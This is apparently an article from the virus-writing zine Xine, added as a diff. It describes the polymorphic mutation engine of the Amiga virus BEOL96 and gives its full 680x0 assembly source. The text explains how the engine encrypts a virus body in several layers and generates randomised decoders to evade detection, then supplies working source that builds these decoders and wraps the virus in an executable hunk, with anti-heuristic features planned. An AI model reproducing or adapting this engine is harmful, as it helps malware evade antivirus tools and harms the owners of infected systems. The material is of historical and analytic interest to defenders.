@@ -1,0 +1,619 @@
+
+                                        /-----------------------------\
+                                        | Xine - issue #2 - Phile 031 |
+                                        \-----------------------------/
+
+==============================================================================
+                   The Mutation Engine used in BEOL96
+                   ==================================
+
+Welcome to the best mutation engine ever written for Amiga computers!
+(I think it's even the best one for 680x0 in general!)
+
+It still lacks some features, a good mutation engine should have:
+    * Insertion of dummy-instruction. (2 different types: Instructions
+      not changing anything and instructions changing unused registers)
+      This shouldn't be hard to implement.
+    * More than just 4 variations per block. Easy.
+    * Mixing independant blocks or independant instructions. This would
+      need a complete redesign.
+    * Anti-heuristics and Anti-debugging.
+    * Eliminate the statik movem.l d0-a6,-(a7)
+    * More than just 3 encodings per layer
+    * More types of encodings
+    * More than just 4 layers
+
+Anyway I think this one is a good start, expect more to come!
+
+
+How it works
+------------
+The decoder consitst of 9 Blocks:
+
+Block1: Load Address of coded Data in AddressRegister #3
+Block2: Load length of coded Data in DataRegister #2
+Block3: Load ExecBase in A6
+Block4: Decode Byte pointed to by AddressRegister #3 (add, sub or rol)
+Block5: Like Block5 but using eor, nop or rol
+Block6: Like Block5
+Block7: add 1 to AddressRegister #3
+Block8: decrease DataRegister #2 and jump to 1st decoder if >0
+Block9: call CacheClearU()
+
+The blocks are affected with these dependencies:
+#1, #2 and #3 are independent
+#4, #5 and #6 may only occur after #1 and #2
+#7 may only occur after #4, #5, #6
+#8 may only occur after #7
+#9 may only occur after #3 and #8
+
+For each block there are 4 different variations. e.g. block #7:
+    1. addq.w #1,addressregister #3
+    2. pea (addressregister #3)
+       addq.l #1,(a7)
+       move.l (a7)+,addressregister #3
+    3. moveq #1,dataregister #3                     ;(d3 is a dummy register)
+       add.w d3,addressregister #3
+    4. move.b (addressregister #3)+,dataregister #3 ;(d3 is a dummy register)
+
+
+Implementation
+--------------
+
+ * Get a random word to encode the 1st word of the second hunk.
+ * Disable multitasking, because the data used by the polymorphic engine
+   will be manipulated.
+ * Get number of encryption-layers
+ * For each encryption-layer:
+    * Modify data to use correct size
+    * Make a table with 6 data and 6 address registers
+    * Clear Label (meaning that no Looplabel was set)
+    * Write Blocks until all blocks are written
+    * Resolve forward reference (lea codeddata(pc),a0)
+    * increase len of virus
+    * encode virus
+    * copy decoder in front of virus
+    * remove temporary data from stack
+ * Adjust viruslen to longword size
+ * Add HUNK_CODE structure & movem.l d0-a6,-(a7) in front of virus
+
+
+Remarks
+-------
+ * In the decoder, there are to references:
+   One backward reference in Block #8 (jump to decoding loop) which will be
+   resolved during the creation of the decoder. (The position of the loop
+   beginning is remembered when the 1st decoding block occurs, so the
+   correct offset can easily be computed in Block #8).
+
+   One forward reference in Block #1 which can only be resolved _after_ the
+   complete decoder has been created. For this purpose, the position of
+   the forward reference will be remembered.
+
+
+
+
+
+
+
+
+Source
+------
+
+
+;This is the sourcecode for the Mutation Engine including a little testroutine.
+;tabsize = 8
+
+TestProggy:
+	move.l	4.w,a6
+.l2	lea	Test2+viruslen+12(pc),a1
+	lea	end(pc),a0
+	move.w	#viruslen-1,d5
+	bsr.w	Poly
+	jsr	-636(a6)
+	bsr.w	Test2+8
+	btst	#6,$bfe001
+	bne.b	.l2
+	rts
+MMOC:	movem.l	d0-d7/a0-a6,-(a7)
+HUNK_END	=	1010
+HUNK_CODE	=	1001
+_LVOForbid	=	-132
+_LVOPermit	=	-138
+
+
+***************************************************************************
+* Data needed by the polymorphic routine. This is a kind of very simple   *
+* 'Programming Language': It consitsts of Opcodes followed by Parameters. *
+* There's no kind of Programmflow-control, so you won't be able to do	  *
+* anything useful with it ;)						  *
+***************************************************************************
+;Opcodes (allways bytes):
+;	$00=END
+;	$01=WORD with register in bits 9-11
+;	    after opcode follow the regno. & the word
+;	$02=WORD with register in bits 0-3
+;	    after opcode follow the regno. & the word
+;	$03=WORD with register in bits 0-3 and 9-11
+;	    after opcode follow the 2 regno.s & the word
+;	$04=constant WORD (wich follows the opcode)
+;	$05=constant LONG (wich follows the opcode)
+;	$06=WORD constant (which follows the opcode)+random word
+;	$07=-rand word
+;	    NOTE: automatically calls a END!!!
+;	$08=EXT.Ws the rand and call a $06 command
+;	$09=register in bits 4-7 random byte to bits 0-8
+;	    NOTE: automatically calls a END!!!
+;	$0a=Offset to Loop
+;	$0b=cut rand to 1-8
+;	$0c=WORD with register in bits 0-3 and random in bits 9-11
+;	    NOTE: automatically calls a END!!!
+;	$0d=Marks Loop beginnning
+;	$0e=offset to coded part (WORD)
+;	$0f=offset to coded part (WORD)+ rand
+;	    NOTE: automatically calls $0b
+;	$10=offset to coded part (WORD)- rand
+;	    NOTE: automatically calls $0b
+;	$11=Decoder. After the opcode follows register, then follows
+;	    the offset of the encode-subroutine (sounds much more
+;	    complicated than it actually is!
+;	    I'm just too stupid and too lazy to explain it...)
+;	    This command automatically makes a END, so there is no
+;	    need of a $00 command after a $11 command!
+;	$12=Like $11,but Without encoding Opcode
+;Registers:
+;	Allways bytes, 0-5 represent d0-d5, 6-11 represent a0-a5
+;
+;Used regs:	d0(00) d1(01)
+;		d2(02)=virlen-1
+;		d3(03)
+;		a0(06) a1(07) a2(08)
+;		a3(09)=ptr to coded
+*******************************************************************
+*	                   Create the decoder			  *
+*******************************************************************
+DoEOR:	eor.b	d2,d0
+	rts
+DoSUB:	sub.b	d2,d0
+	rts
+DoROR:	ror.b	#3,d0
+	rts
+DoADD:	add.b	d2,d0
+DoRTS:	rts
+;maxlen=6
+DEC:	dc.b	%11000	;needs lea coded(pc),a3 & move.w #virlen-1,d2
+	dc.b	DEC2-DEC-1,DEC3-DEC-1,DEC5-DEC-1,DEC3-DEC-1
+DECALT:	dc.b	%11000	;needs lea coded(pc),a3 & move.w #virlen-1,d2
+	dc.b	DEC1-DECALT-1,DEC4-DECALT-1,DEC5-DECALT-1,DEC5-DECALT-1
+
+DEC1:	dc.b	$11,$0a,DoEOR-*-1		;eor,eor
+DEC2:	dc.b	$11,$06,DoSUB-*-1		;add,sub
+DEC3:	dc.b	$11,$04,DoADD-*-1		;sub,add
+DEC4:	dc.b	$0d,$12,DoRTS-*-1		;Nothing
+DEC5:	dc.b	$0d,$03,$03,$09,$10,$10		;move.b (a3),d3
+	dc.b	$02,$03,$e7,$18			;rol.b #3,d3
+	dc.b	$03,$09,$03,$10,$80		;move.b	d3,(a3)
+	dc.b	$12,DoROR-*-1
+*******************************************************************
+*	      Create a lea Coded(pc),ax equivalent code		  *
+*******************************************************************
+;maxlen=6
+C2AX:	dc.b	0
+	dc.b	C2AX1-C2AX-1,C2AX2-C2AX-1,C2AX3-C2AX-1,C2AX4-C2AX-1
+;Version 1: lea Coded(pc),ax
+C2AX1:	dc.b	$01,$09,$41,$fa			;lea $xxxx(pc),a3
+	dc.b	$0e				;offset
+	dc.b	$00
+;Version 3: lea Coded+%xxx(pc),ax subq.l #%xxx,ax
+C2AX3:	dc.b	$01,$09,$41,$fa			;lea $xxxx(pc),a3
+	dc.b	$0f				;offset+rand
+	dc.b	$0c,$09,$51,$88			;subq.l #rand,a3
+;Version 4: lea Coded-%xxx(pc),ax addq.l #%xxx,ax
+C2AX4:	dc.b	$01,$09,$41,$fa			;lea $xxxx(pc),a3
+	dc.b	$10				;offset-rand
+	dc.b	$0c,$09,$50,$88			;addq.l #rand,a3
+;Version 2: pea Coded(pc) move.w (a7)+,ax
+C2AX2:	dc.b	$04,$48,$7a			;pea $xxxx(pc)
+	dc.b	$0e				;offset
+	dc.b	$01,$09,$20,$5f			;movea.l (a7)+,a3
+;Remark: FALL THRU!!
+*******************************************************************
+*	    Create a move.w #virlen-1,dx equivalent code	  *
+*******************************************************************
+;maxlen=8
+L2DX:	dc.b	0
+	dc.b	L2DX1-L2DX-1,L2DX2-L2DX-1,L2DX3-L2DX-1,L2DX4-L2DX-1
+;Version 1: lea virlen-1.w,ax move.w ax,dx
+L2DX1:	dc.b	$01,$08,$41,$f8			;lea $xxxx.w,a2
+	dc.b	$04
+LEN1:	dc.b	0,0				;virlen-1
+	dc.b	$03,$02,$08,$20,$08		;move.w a2,d2
+	dc.b	0
+;Version 2: pea virlen-1.w move.w (a7)+,dx
+L2DX2:	dc.b	$05,$48,$78
+LEN2:	dc.b	0,0				;pea virlen-1.w
+	dc.b	$01,$02,$20,$1f			;move.l (a7)+,d2
+	dc.b	0
+;Version 3: move.w #virlen+%xxx.w,dx subq #%xxx,dx
+L2DX3:	dc.b	$01,$02,$30,$3c			;move.w #$xxxx,d2
+	dc.b	$0b				;cut rand
+	dc.b	$06
+LEN3:	dc.b	0,0				;virlen-1+rand
+	dc.b	$0c,$02,$51,$40			;subq #rand,d2
+;Version 4: move.w #virlen+$xxxx.w,dx add.w #-$xxxx,dx
+L2DX4:	dc.b	$01,$02,$30,$3c			;move.w	#$xxxx,d2
+	dc.b	$06
+LEN4:	dc.b	0,0				;virlen-1-rand
+	dc.b	$02,$02,$06,$40			;add.w #$xxxx,d2
+	dc.b	$07				;-rand.w
+
+BlockT:	dc.b	DEC-BlockT,DECALT-BlockT,DECALT-BlockT
+	dc.b	C2AX-BlockT,L2DX-BlockT,ADDAX-BlockT
+	dc.b	EXEC2A6-BlockT,LOOP-BlockT
+	dc.b	JCC-BlockT
+
+
+*******************************************************************
+*	    Create a addq.w #1,a3 equivalent code		  *
+*******************************************************************
+;maxlen=6
+ADDAX:	dc.b	%00000111	;need the 3 encoders
+	dc.b	ADDAX1-ADDAX-1,ADDAX2-ADDAX-1,ADDAX3-ADDAX-1,ADDAX4-ADDAX-1
+ADDAX1:	dc.b	$02,$09,$52,$48			;addq.w #1,a3
+	dc.b	0
+ADDAX2:	dc.b	$02,$09,$48,$50			;pea (a3)
+	dc.b	$04,$52,$97			;addq.l #1,(a7)
+	dc.b	$01,$09,$20,$5f			;move.l (a7)+,a3
+	dc.b	0
+ADDAX3:	dc.b	$01,$03,$70,$01			;moveq #1,d3
+	dc.b	$03,$09,$03,$d0,$c0		;add.w d3,a3
+	dc.b	0
+ADDAX4:	dc.b	$03,$03,$09,$10,$18		;move.b (a3)+,d3
+	dc.b	0
+
+
+*******************************************************************
+*	    Create a dbf d0,loop equivalent code		  *
+*******************************************************************
+;maxlen=10
+LOOP:	dc.b	%00100111		;need the 3 encoders
+	dc.b	LOOP1-LOOP-1,LOOP2-LOOP-1,LOOP3-LOOP-1,LOOP3-LOOP-1
+LOOP1:	dc.b	$02,$02,$51,$c8,$0a	;dbf d0,loop
+LOOP2:	dc.b	$02,$02,$53,$40		;subq.w	#1,d2
+	dc.b	$04,$6a,$00,$0a		;bpl.w loop
+LOOP3:	dc.b	$02,$02,$4a,$40		;tst.w d2
+	dc.b	$04,$67,$06		;beq.b exit
+	dc.b	$02,$02,$53,$40		;subq.w	#1,d2
+	dc.b	$04,$60,$00,$0a		;bra.w loop
+*******************************************************************
+*	       Create a jsr -636(a6) equivalent code		  *
+*******************************************************************
+;maxlen=8
+JCC:	dc.b	%11000000	;needs move.l 4.w,a6 & decoder
+	dc.b	JCC1-JCC-1,JCC2-JCC-1,JCC3-JCC-1,JCC4-JCC-1
+;Version 1: pea *+6 jmp -636(a6)
+JCC1:	dc.b	$05,$48,$7a,$00,$06		;pea *+6
+	dc.b	$05,$4e,$ee,$fd,$84		;jmp -636(a6)
+	dc.b	0
+;Version 2: lea -636+$yyyy(a6),ax jsr -$yyyy(ax)
+JCC2:	dc.b	$01,$07,$41,$ee			;lea $xxxx(a6),a1
+	dc.b	$06,$fd,$84			; -636+rand.w
+	dc.b	$02,$07,$4e,$a8			;jsr $xxxx(a1)
+	dc.b	$07				; -rand.w
+;Version 3: move.w #-636+$yy,dx jsr -$yy(a6,dx.w)
+JCC3:	dc.b	$01,$01,$30,$3c			;move.w #$xxxx,d1
+	dc.b	$08,$fd,$84			; -636+rand.b
+	dc.b	$04,$4e,$b6			;jsr $xx(a6,dx.w)
+	dc.b	$09,$01				;register=d1 offset=-rand.b
+;Version 4:
+JCC4:	dc.b	$05,$4e,$ae,$fd,$84		;jsr -636(a6)
+;Remark: FALL THRU!!!
+*******************************************************************
+*	       Create a move.l 4.w,a6 equivalent code		  *
+*******************************************************************
+;maxlen=8
+EXEC2A6:	dc.b	0
+		dc.b	EXEC2A61-EXEC2A6-1,EXEC2A62-EXEC2A6-1
+		dc.b	EXEC2A63-EXEC2A6-1,EXEC2A64-EXEC2A6-1
+;Version 1: move.l 4.w,a6
+EXEC2A61:	dc.b	$05,$2c,$78,$00,$04	;move.l $0004.w,a6
+		dc.b	0
+;Version 2: moveq #$4,dx move.l dx,ay move.l (ay),a6
+EXEC2A62:	dc.b	$01,$00,$70,$04		;moveq #$04,d0
+		dc.b	$03,$06,$00,$20,$40	;movea.l d0,a0
+		dc.b	$02,$06,$2c,$50		;move.l (a0),a6
+		dc.b	0
+;Version 3: move.l 4.w,dx move.l dx,a6
+EXEC2A63:	dc.b	$01,$00,$20,$38		;move.l $xxxx.w,d0
+		dc.b	$04,$00,$04		;4.w
+		dc.b	$02,$00,$2c,$40		;movea.l d0,a6
+		dc.b	0
+;Version 4: lea (4+rand).w,ax move.l (-rand,ax),a6
+EXEC2A64:	dc.b	$01,$06,$41,$f8		;lea $xxxx.w,a0
+		dc.b	$06,$00,$04		;4.w+rand
+		dc.b	$02,$06,$2c,$68		;move.l $xxxx(a0),a6
+		dc.b	$07			;-rand.w
+	even
+
+*************************************************************************
+* Poly: Creates the HUNK_CODE of the Virus. This routine encodes the	*
+*	virus and makes a polymorphic decoder. This is repeated up to 4	*
+*	times, and then the HUNK_CODE and HUNK_END is added.		*
+* Input: d5.w=VirusLen-1						*
+*	 a0  =Pointer to _END_ of Virus					*
+*	 a1  =Pointer to Buffer+VirusLen+12				*
+* Output: d2.w= Random encoding value					*
+*	  d5.l=len of HUNK_CODE/4					*
+* Destroys: /								*
+* Remark: Buffer must be at least VLen+4*MaxDecoderSize+12 bytes large	*
+* Remark2: Most of this code is much older than the rest of the virus,  *
+*	   so maybe it doesn't fit very well... but who cares???	*
+*************************************************************************
+NumBlocks	=	9
+MaxDecoderSize	=	64
+Rand:	move.b	$dff007,d0
+	eor.b	d0,d7
+	rol.w	#7,d7
+	move.w	d7,d0
+	rts
+RandByte:
+	bsr.b	Rand
+	lsr.w	#8,d0
+	rts
+Poly:
+	movem.l	d0/d1/d3/d4/d6/d7/a0-a6,-(a7)
+	bsr.b	Rand
+	move.w	d0,(eor1st+2-end,a0)	;to decode 1st word of 2nd hunk
+	move.l	d0,-(a7)
+	jsr	(_LVOForbid,a6)
+;Mark virlen in the code
+	bsr.b	RandByte
+	lsr.b	#6,d0
+	move.w	d0,d4		;Between 1 and 4 decoders
+.bigloop:
+	move.w	d5,d1
+	lsr.w	#8,d1		;HiByte
+	bsr.b	.lente
+.lent	dc.w	LEN1-.lent,LEN2-LEN1-2,LEN3-LEN2-2,LEN4-LEN3-2
+.lente
+	moveq	#4-1,d2		;Here we modify the commands, in order
+	move.l	(a7),a3		;to create the right move.w #codedlen,d0
+	move.l	(a7)+,a2	;statement!
+.lenl	add.w	(a2)+,a3
+	move.b	d1,(a3)+
+	move.b	d5,(a3)+
+	dbf	d2,.lenl
+;First we create a table with 6 data and 6 address registers...
+	link	a2,#-12-18-8-100
+				;Make space (12 for the regs
+				;+18 for the decoders + 8 for references
+				;+100 for temporary space
+	move.l	a7,a5		;Space for decoder data
+	lea	18(a5),a4
+.regl	moveq	#-64,d1		;we don't want a6 and a7 to be used!
+	moveq	#6-1,d3		;Get the 6 regs
+.tryag	bsr.b	Rand
+	lsr.b	#5,d0
+	bset	d0,d1		;Set and test
+	bne.b	.tryag		;we have this one allready....
+	move.b	d0,-(a2)	;write register to tab
+	dbf	d3,.tryag
+	addq.w	#1,d2		;if d2 was -1, it was the 1st time
+	beq.b	.regl
+
+	clr.l	-8(a2)		;LoopLabelPos
+
+	moveq	#0,d6		;no block written
+.bl	bsr.b	Rand
+	move.w	d0,d2		;Random number=>d2
+	asr.w	#2,d2		;Scale down a bit!
+
+	bsr.b	RandByte
+	lsr.b	#4,d0
+	move.w	d0,d1
+	subq.w	#NumBlocks-1,d1
+	bgt.b	.bl
+
+	lea	BlockT(pc),a3
+	move.b	NumBlocks-1(a3,d1.w),d1
+	ext.w	d1
+	add.w	d1,a3		;Pointer to Code for Block
+	move.b	d6,d3
+	and.b	(a3),d3
+	cmp.b	(a3)+,d3	;All needed blocks allready written????
+	bne.b	.bl
+	bset	d0,d6		;Set Blockbit
+	bne.b	.bl		;Allready written=>loop
+	bsr.w	RandByte
+	lsr.b	#6,d0
+	move.b	(a3,d0.w),d0	;One of 4 variants
+	add.w	d0,a3
+
+	bsr.b	DoComm		;DoIT
+
+	move.w	d6,d0
+	lsl.w	#7,d0		;test bit nr.8
+	bpl.b	.bl
+
+	move.l	-(a2),a3	;ForwardRef
+	move.l	a4,d0
+	sub.l	a3,d0
+	add.w	d0,(a3)		;Correct it
+
+	move.l	a4,d1		;begin of decoder
+	sub.l	a5,d1		;d1=len of decoder
+	add.w	d1,a1		;ptr to end of virus
+	move.l	a1,a3		;ptr to end of virus
+	move.l	d5,d6
+	add.w	d1,d5		;Increase len
+.cl1	move.b	-(a0),d0	;get next byte
+	moveq	#3-1,d3		;3 encoders
+.cl2	move.w	-(a5),d2	;encoder data
+	move.l	-(a5),a2	;encoder routine
+	jsr	(a2)		;encode byte
+	dbf	d3,.cl2
+	lea	18(a5),a5	;first encoder
+	move.b	d0,-(a3)	;store coded byte
+	dbf	d6,.cl1
+	subq.w	#1,d1
+.cl3	move.b	-(a4),-(a3)	;copy decoder
+	dbf	d1,.cl3
+	move.l	a1,a0
+	lea	12+18+8+100+4(a7),a7	;get rid of the regs
+	dbf	d4,.bigloop
+	jsr	(_LVOPermit,a6)
+	addq.w	#3+4,d5		;len of virus+4+2
+	lsr.w	#2,d5		;len of virus>>2
+	bcs.b	.lenok
+	addq.w	#2,a1		;longwordalign
+.lenok	lea	HUNK_END.w,a2
+	move.l	a2,(a1)
+	move.l	MMOC(pc),-(a3)
+	ext.l	d5
+	move.l	d5,-(a3)	;HUNKLEN
+	subq.w	#8,a2
+	subq.w	#HUNK_END-HUNK_CODE-8,a2
+	move.l	a2,-(a3)
+	move.l	(a7)+,d2
+	movem.l	(a7)+,d0/d1/d3/d4/d6/d7/a0-a6
+	rts			;DONE!
+
+DoComm:
+.comml:	move.b	(a3)+,d0	;get opcode
+	ext.w	d0
+	move.b	CommT(pc,d0.w),d0
+	ext.w	d0
+	jsr	CommT(pc,d0.w)
+	bra.b	.comml
+
+
+DOLOOP:
+	move.l	-8(a2),d0	;LoopLabelPos
+	sub.l	a4,d0
+	move.w	d0,(a4)+
+	bra.b	EndComm
+
+RAND18:	and.w	#%111,d2
+	addq.w	#1,d2		;from 1-8
+	rts
+
+OFFSET:	moveq	#0,d0
+	bra.b	DOOFF
+OFFMR:	bsr.b	RAND18
+	move.w	d2,d0
+	neg.w	d0
+	bra.b	DOOFF
+OFFPR:	bsr.b	RAND18
+	move.w	d2,d0
+DOOFF:	move.l	a4,-4(a2)	;ForwardRef
+	move.w	d0,(a4)+
+	rts
+
+REG4:	bsr.b	GetReg
+	lsl.b	#4,d1
+	move.b	d1,(a4)+
+	move.b	d2,(a4)
+	neg.b	(a4)+
+;**** FALL THRU TO ENDCOMM! ****
+EndComm:
+	addq.l	#4,a7		;because we did a jsr
+	rts
+
+WORD9:	bsr.b	GetReg
+	ror.w	#7,d1		;to bits 9-11
+WORD9C:	bsr.b	GetWord
+	or	d0,d1
+	move.w	d1,(a4)+
+	rts
+
+WORD0:	bsr.b	GetReg
+	bra.b	WORD9C
+WORD9_0:
+	bsr.b	GetReg
+	ror.w	#7,d1
+	move.w	d1,d0
+	bsr.b	GetReg
+	or	d0,d1
+	bra.b	WORD9C
+
+CommT:	dc.b	EndComm-CommT,WORD9-CommT,WORD0-CommT,WORD9_0-CommT
+	dc.b	WORDOP-CommT,LONGOP-CommT,WRAND-CommT,MRAND-CommT
+	dc.b	EXTRAND-CommT,REG4-CommT,DOLOOP-CommT,RAND18-CommT
+	dc.b	QUICK-CommT,LABELPOS-CommT,OFFSET-CommT,OFFPR-CommT
+	dc.b	OFFMR-CommT,DECODER-CommT,DECODER2-CommT
+	even
+
+LONGOP:	move.b	(a3)+,(a4)+
+	move.b	(a3)+,(a4)+
+WORDOP:	move.b	(a3)+,(a4)+	;It could lie on an odd address
+	move.b	(a3)+,(a4)+
+	rts
+
+
+EXTRAND:
+	asr.b	#1,d2		;to exclude the $80 case
+	ext.w	d2
+WRAND:	bsr.b	GetWord
+	add.w	d2,d0
+	move.w	d0,(a4)+
+	rts
+MRAND:	move.w	d2,(a4)
+	neg.w	(a4)+
+GoEnd:	bra.b	EndComm
+QUICK:	bsr.b	GetReg
+	bsr.b	GetWord
+	move.w	d0,(a4)
+	lsl.w	#5,d2		;Kill bit nr.3
+	lsr.w	#4,d2		;Move to right pos
+	or.b	d2,(a4)+
+	or.b	d1,(a4)+
+	bra.b	EndComm
+
+GetReg:	moveq	#0,d1
+	move.b	(a3)+,d1
+	move.b	(a2,d1.w),d1
+	rts
+GetWord:
+	move.b	(a3)+,d0
+	lsl.w	#8,d0
+	move.b	(a3)+,d0
+	rts
+
+LABELPOS:
+	tst.l	-8(a2)		;LoopLabelPos
+	bne.b	NOTFIRST
+	move.l	a4,-8(a2)	;LoopLabelPos
+NOTFIRST:
+	rts
+DECODER:
+	bsr.b	LABELPOS
+	move.b	(a3)+,d0
+	move.b	d0,(a4)+
+	move.b	9(a2),(a4)	;register A3
+	bset	#4,(a4)+	;length=.b <ea>=data register direct
+D2NOK:	not.b	d2
+	beq.b	D2NOK
+	move.w	d2,(a4)+
+DECODER2:
+	move.b	(a3)+,d1
+	ext.w	d1
+	pea	(a3,d1.w)
+	move.l	(a7)+,(a5)+
+	move.w	d2,(a5)+
+	bra.b	GoEnd
+
+
+
+
+Test:
+	move.w	#100,d0
+.tl	move.w	#$f00,$dff180		;flash
+	dbf	d0,.tl
+eor1st	eor.w	#$0000,d0		;decode 1st word of 2nd hunk
+	movem.l	(a7)+,d0-d7/a0-a6
+	rts
+viruslen	=	2000
+end=Test+viruslen
+	blk.b	2000
+Test2:	blk.b	2000
+	blk.b	2000
